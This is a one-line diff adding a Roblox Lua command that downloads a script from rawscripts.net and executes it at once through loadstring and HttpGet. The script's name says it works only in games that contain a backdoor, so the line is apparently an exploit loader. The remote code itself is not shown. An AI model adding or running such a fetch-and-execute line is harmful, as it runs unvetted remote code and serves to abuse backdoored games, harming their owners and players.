@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Free-skybox-not-visual-but-need-backdoor-game-65675"))()
